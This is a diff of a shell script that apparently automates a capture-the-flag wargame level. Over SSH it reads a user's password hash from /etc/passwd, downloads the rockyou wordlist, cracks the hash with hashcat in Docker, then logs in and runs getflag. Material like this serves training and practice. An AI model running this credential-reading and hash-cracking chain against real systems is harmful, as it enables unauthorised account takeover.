@@ -11,29 +11,81 @@ log() {
     echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
 }
 
-download_rockyou_wordlist() {
-    wordlist_dir="$1";
-    rockyou_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";
+is_url() {
+    case "$1" in
+        http://*|https://*) return 0 ;;
+        *) return 1 ;;
+    esac
+}
 
-    if [ -z "$wordlist_dir" ]; then
-        log "Error: download_rockyou_wordlist: missing wordlist directory" >&2;
+is_file() {
+    if [ -f "$1" ]; then
+        return 0;
+    else
+        return 1;
+    fi
+}
+
+is_dir() {
+    if [ -d "$1" ]; then
+        return 0;
+    else
+        return 1;
+    fi
+}
+
+download_wordlist() {
+    url="$1";
+    wordlist_dir="$2";
+
+    # Handles plain files, .gz and .zip archives.
+
+    if [ -z "$url" ] || [ -z "$wordlist_dir" ]; then
+        log "Error: download_wordlist: missing arguments. You should provide <url> <wordlist_dir>." >&2;
         return 1;
     fi
 
     if [ ! -d "$wordlist_dir" ]; then
-        log "Error: download_rockyou_wordlist: '$wordlist_dir' is not a directory" >&2;
+        log "Error: download_wordlist: '$wordlist_dir' is expected to be an accessible existing directory." >&2;
         return 1;
     fi
 
-    if [ -f "$wordlist_dir/rockyou.txt" ]; then
-        echo "$wordlist_dir/rockyou.txt";
-        return 0;
+    filename="$(basename "$url")";
+    out_file="$wordlist_dir/$filename";
+    curl -L "$url" -o "$out_file" --silent --show-error --fail || return 1;
+
+    case "$out_file" in
+        *.gz)
+            trap 'rm -f "$out_file"' EXIT;
+            assert_gzip;
+            gzip -d -f "$out_file" || return 1;
+            ;;
+        *.zip)
+            trap 'rm -f "$out_file"' EXIT;
+            assert_unzip;
+            unzip -o "$out_file" -d "$wordlist_dir" || return 1;
+            ;;
+        *)
+            ;;
+    esac
+}
+
+###########
+### APT ###
+###########
+
+assert_gzip() {
+    if ! command -v gzip >/dev/null 2>&1; then
+        log "Error: the 'gzip' command is required. Considering installing the gzip package." >&2;
+        exit 1;
     fi
+}
 
-    curl -L "$rockyou_wordlist_url" -o "$wordlist_dir/rockyou.txt.gz" --silent --show-error --fail || return 1;
-    gzip -d "$wordlist_dir/rockyou.txt.gz" || return 1;
-
-    echo "$wordlist_dir/rockyou.txt";
+assert_unzip() {
+    if ! command -v unzip >/dev/null 2>&1; then
+        log "Error: the 'unzip' command is required. Considering installing the unzip package." >&2;
+        exit 1;
+    fi
 }
 
 ##############
@@ -47,31 +99,54 @@ assert_docker() {
     fi
 }
 
-hashcat_crack_hash() {
+crack_hash() {
     assert_docker;
 
-    hash="$1";
+    hash_to_crack="$1";
     out_dir="$2";
-    wordlist_path="$3";
+    wordlist_dir="$3";
 
-    if [ -z "$hash" ] || [ -z "$out_dir" ] || [ -z "$wordlist_path" ]; then
-        log "Error: hashcat_crack_hash: missing arguments. You should provide <hash> <out_dir> <wordlist_path>." >&2;
+    if [ -z "$hash_to_crack" ] || [ -z "$out_dir" ] || [ -z "$wordlist_dir" ]; then
+        log "Error: crack_hash: missing arguments. Expected: <hash_to_crack> <out_dir> <wordlist_dir>" >&2;
         return 1;
     fi
 
-    if [ ! -f "$wordlist_path" ]; then
-        default_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";
-        echo "No wordlist found at $wordlist_path. Downloading and extracting the default wordlist: $default_wordlist_url";
-        curl -L "$default_wordlist_url" -o "$wordlist_path.gz" --silent --show-error --fail || return 1;
-        gzip -d "$wordlist_path.gz" || return 1;
+    shift 3;
+    
+    for wordlist_url in "$@"; do
+        if is_url "$wordlist_url"; then
+            log "Downloading - and extracting - wordlist(s) from $wordlist_url to $wordlist_dir";
+            download_wordlist "$wordlist_url" "$wordlist_dir";
+        fi    
+    done
+
+    if [ ! -d "$out_dir" ]; then
+        log "Error: crack_hash: '$out_dir' is expected to be an accessible existing directory." >&2;
+        return 1;
     fi
 
-    docker run --rm -it \
-        -v "$wordlist_path:/wordlist.txt:ro" \
-        -v "$out_dir:/out:rw" dizcza/docker-hashcat:pocl \
-        hashcat --attack-mode 3 --hash-type 1500 "$hash" /wordlist.txt -o /out/cracked.txt >/dev/null 2>&1;
-    cracked_password=$(cat "$out_dir/cracked.txt" | cut -d: -f2);
-    echo "$cracked_password";
+    docker_mapped_wordlists=""
+    for filename in $(ls "$wordlist_dir"); do
+        docker_mapped_wordlists="$docker_mapped_wordlists /wordlists/$filename";
+    done
+
+    if [ -f "$out_dir/cracked.txt" ]; then
+        log "Hash has already been cracked. Skipping hashcat cracking attempt."
+    else
+        log "Attempting to CPU crack the hash '$hash_to_crack' using hashcat. This could take a while... Expect 2-5 minutes depending on the used system.";
+        docker run --rm -it \
+            -v "$wordlist_dir:/wordlists:ro" \
+            -v "$out_dir:/out:rw" \
+            dizcza/docker-hashcat:pocl \
+            hashcat --attack-mode 3 --hash-type 1500 "$hash_to_crack" $docker_mapped_wordlists -o /out/cracked.txt;
+
+        if [ ! -f "$out_dir/cracked.txt" ]; then
+            log "Error: crack_hash: failed to crack the hash '$hash_to_crack'." >&2;
+            return 1;
+        fi
+    fi
+
+    return 0;
 }
 
 ###########
@@ -193,12 +268,21 @@ main() {
     flag01_username="flag01";
     flag01_password="";
 
-    wordlist_path=$(download_rockyou_wordlist "$CURR_DIR_PATH/tshark/wordlists" || exit 1);
+    cracked_hashes_dir="$CURR_DIR_PATH/tshark/cracked_hashes";
+    wordlists_dir="$CURR_DIR_PATH/tshark/wordlists";
 
     init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
     hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2");
-    flag01_password=$(hashcat_crack_hash "$hashed_password"  "$CURR_DIR_PATH/tshark/out" "$wordlist_path");
     close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username";
+
+    crack_hash "$hashed_password" "$cracked_hashes_dir" "$wordlists_dir" "https://weakpass.com/download/90/rockyou.txt.gz";
+    if [ $? -ne 0 ]; then
+        log "Error: main: failed to crack the hashed password '$hashed_password'." >&2;
+        exit 1;
+    fi
+
+    cracked_password=$(cat "$out_dir/cracked.txt" | tail -n 1 | cut -d: -f2);
+    flag01_password="$cracked_password";
 
     init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
     checkflag_str=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag");
